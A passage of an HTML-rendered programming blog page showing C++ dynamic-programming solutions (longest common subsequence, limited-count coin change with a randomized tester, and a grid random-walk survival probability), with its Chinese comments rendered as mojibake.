class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; M; j++) &#123;<br>        dp[<span class="hljs-number">0</span>][j] = (str1[<span class="hljs-number">0</span>] == str2[j]) ? <span class="hljs-number">1</span> : dp[<span class="hljs-number">0</span>][j - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        dp[i][<span class="hljs-number">0</span>] = (str1[i] == str2[<span class="hljs-number">0</span>]) ? <span class="hljs-number">1</span> : dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; M; j++) &#123;<br>            <span class="hljs-type">int</span> p1 = dp[i - <span class="hljs-number">1</span>][j];<br>            <span class="hljs-type">int</span> p2 = dp[i][j - <span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> p3 = (str1[i] == str2[j]) ? (<span class="hljs-number">1</span> + dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) : <span class="hljs-number">0</span>;<br>            dp[i][j] = max(p1, max(p2, p3));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[N - <span class="hljs-number">1</span>][M - <span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> s1 = <span class="hljs-string">&quot;abcde&quot;</span>;<br>    <span class="hljs-built_in">string</span> s2 = <span class="hljs-string">&quot;ace&quot;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Longest Common Subsequence (Recursive): &quot;</span> &lt;&lt; longestCommonSubsequence1(s1, s2) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Longest Common Subsequence (DP): &quot;</span> &lt;&lt; longestCommonSubsequence2(s1, s2) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ç¡¬å¸æ‰¾é›¶é—®é¢˜"><a href="#ç¡¬å¸æ‰¾é›¶é—®é¢˜" class="headerlink" title="ç¡¬å¸æ‰¾é›¶é—®é¢˜"></a>ç¡¬å¸æ‰¾é›¶é—®é¢˜</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// ç»Ÿè®¡ç¡¬å¸é¢å€¼å’Œå¼ æ•°,å‡è®¾è¾“å…¥æ•°ç»„æ˜¯ï¼š1, 2, 2, 3, 3, 3,éå† arr ç»Ÿè®¡æ¯ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œcounts ä¼šå˜æˆ &#123;1: 1, 2: 2, 3: 3&#125;ã€‚ç„¶åï¼Œä»£ç éå† counts å¹¶å°†ï¼š1 åŠ å…¥ coinsï¼Œ1 åŠ å…¥ zhangsã€‚2 åŠ å…¥ coinsï¼Œ2 åŠ å…¥ zhangsã€‚3 åŠ å…¥ coinsï¼Œ3 åŠ å…¥ zhangsã€‚æœ€ç»ˆï¼Œè¿”å› pairï¼šcoins = &#123;1, 2, 3&#125;zhangs = &#123;1, 2, 3&#125;</span><br><span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; getInfo(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr) &#123;<br>    <span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; counts;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) counts[value]++;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; coins, zhangs;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; entry : counts) &#123;<br>        coins.push_back(entry.first);<br>        zhangs.push_back(entry.second);<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;coins, zhangs&#125;;<br>&#125;<br><br><span class="hljs-comment">// é€’å½’æ–¹æ³•</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins, <span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs, <span class="hljs-type">int</span> index, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (index == coins.size()) <span class="hljs-keyword">return</span> rest == <span class="hljs-number">0</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> ways = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> zhang = <span class="hljs-number">0</span>; zhang &lt;= zhangs[index] &amp;&amp; zhang * coins[index] &lt;= rest; zhang++) &#123;<br>        ways += process(coins, zhangs, index + <span class="hljs-number">1</span>, rest - zhang * coins[index]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ways;<br>&#125;<br><span class="hljs-comment">// å…¥å£å‡½æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">coinsWay</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> aim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || aim &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; info = getInfo(arr);<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins = info.first;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs = info.second;<br>    <span class="hljs-keyword">return</span> process(coins, zhangs, <span class="hljs-number">0</span>, aim);<br>&#125;<br><br><br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’æ–¹æ³• 1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp1</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> aim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || aim &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; info = getInfo(arr);<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins = info.first;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs = info.second;<br>    <span class="hljs-type">int</span> N = coins.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(aim + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[N][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = N - <span class="hljs-number">1</span>; index &gt;= <span class="hljs-number">0</span>; index--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= aim; rest++) &#123;<br>            <span class="hljs-type">int</span> ways = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> zhang = <span class="hljs-number">0</span>; zhang &lt;= zhangs[index] &amp;&amp; zhang * coins[index] &lt;= rest; zhang++) &#123;<br>                ways += dp[index + <span class="hljs-number">1</span>][rest - zhang * coins[index]];<br>            &#125;<br>            dp[index][rest] = ways;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][aim];<br>&#125;<br><br><br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’æ–¹æ³• 2ï¼ˆä¼˜åŒ–ï¼‰</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">dp2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr, <span class="hljs-type">int</span> aim)</span> &#123;<br>    <span class="hljs-keyword">if</span> (arr.empty() || aim &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; info = getInfo(arr);<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; coins = info.first;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; zhangs = info.second;<br>    <span class="hljs-type">int</span> N = coins.size();<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; dp(N + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(aim + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br>    dp[N][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> index = N - <span class="hljs-number">1</span>; index &gt;= <span class="hljs-number">0</span>; index--) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">0</span>; rest &lt;= aim; rest++) &#123;<br>            dp[index][rest] = dp[index + <span class="hljs-number">1</span>][rest];<br>            <span class="hljs-keyword">if</span> (rest - coins[index] &gt;= <span class="hljs-number">0</span>) &#123;<br>                dp[index][rest] += dp[index][rest - coins[index]];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (rest - coins[index] * (zhangs[index] + <span class="hljs-number">1</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>                dp[index][rest] -= dp[index + <span class="hljs-number">1</span>][rest - coins[index] * (zhangs[index] + <span class="hljs-number">1</span>)];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][aim];<br>&#125;<br><br><span class="hljs-comment">// éšæœºç”Ÿæˆæµ‹è¯•æ•°ç»„</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">randomArray</span><span class="hljs-params">(<span class="hljs-type">int</span> maxLen, <span class="hljs-type">int</span> maxValue)</span> &#123;<br>    <span class="hljs-type">int</span> N = rand() % maxLen;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">arr</span><span class="hljs-params">(N)</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) arr[i] = rand() % maxValue + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°æ•°ç»„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; arr)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) <span class="hljs-built_in">cout</span> &lt;&lt; value &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-comment">// ä¸»å‡½æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    srand(time(<span class="hljs-number">0</span>));<br>    <span class="hljs-type">int</span> maxLen = <span class="hljs-number">10</span>, maxValue = <span class="hljs-number">20</span>, testTime = <span class="hljs-number">1000000</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•å¼€å§‹&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; testTime; i++) &#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; arr = randomArray(maxLen, maxValue);<br>        <span class="hljs-type">int</span> aim = rand() % maxValue;<br>        <span class="hljs-type">int</span> ans1 = coinsWay(arr, aim);<br>        <span class="hljs-type">int</span> ans2 = dp1(arr, aim);<br>        <span class="hljs-type">int</span> ans3 = dp2(arr, aim);<br>        <span class="hljs-keyword">if</span> (ans1 != ans2 || ans1 != ans3) &#123;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Oops!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            printArray(arr);<br>            <span class="hljs-built_in">cout</span> &lt;&lt; aim &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; ans1 &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ans2 &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ans3 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æµ‹è¯•ç»“æŸ&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="é†‰æ±‰bob"><a href="#é†‰æ±‰bob" class="headerlink" title="é†‰æ±‰bob"></a>é†‰æ±‰bob</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//è®¡ç®—kæ­¥åä¸ä¼šå‡ºå»çš„æ¦‚ç‡</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cmath&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// é€’å½’è§£æ³•ï¼šè®¡ç®—ç”Ÿå­˜å¯èƒ½æ€§</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">livePosibility1</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M)</span> &#123;<br>    <span class="hljs-keyword">return</span> static_cast&lt;<span class="hljs-type">double</span>&gt;(process(row, col, k, N, M)) / <span class="hljs-built_in">pow</span>(<span class="hljs-number">4</span>, k);<br>&#125;<br><span class="hljs-comment">// é€’å½’å¤„ç†å‡½æ•°ï¼Œè¿”å›å½“å‰çŠ¶æ€ä¸‹çš„ç”Ÿå­˜ç‚¹æ•°</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> rest, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M)</span> &#123;<br>    <span class="hljs-keyword">if</span> (row &lt; <span class="hljs-number">0</span> || row &gt;= N || col &lt; <span class="hljs-number">0</span> || col &gt;= M) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœè¶…å‡ºæ£‹ç›˜èŒƒå›´ï¼Œè¿”å›0</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å¦‚æœèµ°å®Œæ‰€æœ‰æ­¥æ•°ä¸”ä»åœ¨æ£‹ç›˜ä¸­ï¼Œè¿”å›1</span><br>    &#125;<br>    <span class="hljs-comment">// ç»§ç»­é€’å½’ï¼Œå°è¯•å››ä¸ªæ–¹å‘</span><br>    <span class="hljs-type">long</span> up = process(row - <span class="hljs-number">1</span>, col, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-type">long</span> down = process(row + <span class="hljs-number">1</span>, col, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-type">long</span> left = process(row, col - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-type">long</span> right = process(row, col + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>, N, M);<br>    <span class="hljs-keyword">return</span> up + down + left + right;<br>&#125;<br><br><br><br><span class="hljs-comment">// åŠ¨æ€è§„åˆ’è§£æ³•ï¼šè®¡ç®—ç”Ÿå­˜å¯èƒ½æ€§</span><br><span class="hljs-type">double</span> <span class="hljs-title function_">livePosibility2</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt;&gt; dp(N, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt;(M, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;(k + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)));<br>    <span class="hljs-comment">// åˆå§‹åŒ– dp æ•°ç»„ï¼Œrest=0 çš„æ—¶å€™æ¯ä¸ªä½ç½®éƒ½ç®—ä½œç”Ÿå­˜ç‚¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; M; ++j) &#123;<br>            dp[i][j][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// åŠ¨æ€è§„åˆ’å¡«è¡¨</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> rest = <span class="hljs-number">1</span>; rest &lt;= k; ++rest) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; N; ++r) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c = <span class="hljs-number">0</span>; c &lt; M; ++c) &#123;<br>                dp[r][c][rest] = pick(dp, N, M, r - <span class="hljs-number">1</span>, c, rest - <span class="hljs-number">1</span>);<br>                dp[r][c][rest] += pick(dp, N, M, r + <span class="hljs-number">1</span>, c, rest - <span class="hljs-number">1</span>);<br>                dp[r][c][rest] += pick(dp, N, M, r, c - <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>);<br>                dp[r][c][rest] += pick(dp, N, M, r, c + <span class="hljs-number">1</span>, rest - <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> static_cast&lt;<span class="hljs-type">double</span>&gt;(dp[row][col][k]) / <span class="hljs-built_in">pow</span>(<span class="hljs-number">4</span>, k);<br>&#125;<br><span class="hljs-comment">// å¸®åŠ©å‡½æ•°ï¼šæ£€æŸ¥å½“å‰ä½ç½®æ˜¯å¦è¶Šç•Œï¼Œå¹¶è¿”å›ç›¸åº”çš„å€¼</span><br><span class="hljs-type">long</span> <span class="hljs-title function_">pick</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span>&gt;&gt;&gt;&amp; dp, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> M, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> rest)</span> &#123;<br>    <span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span> || r &gt;= N || c &lt; <span class="hljs-number">0</span> || c &gt;= M) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// å¦‚æœè¶Šç•Œï¼Œè¿”å›0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[r][c][rest];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// ç¤ºä¾‹ï¼šç»™å®šæ£‹ç›˜å¤§å°50x50ï¼Œèµ°10æ­¥ï¼Œä»ä½ç½®(6,6)å¼€å§‹</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; livePosibility1(<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; livePosibility2(<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="è‹±é›„ä¹‹è·¯"><a href="#è‹±é›„ä¹‹è·¯" class="headerlink" title="è‹±é›„ä¹‹è·¯"></a>è‹±é›„ä¹‹è·¯</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 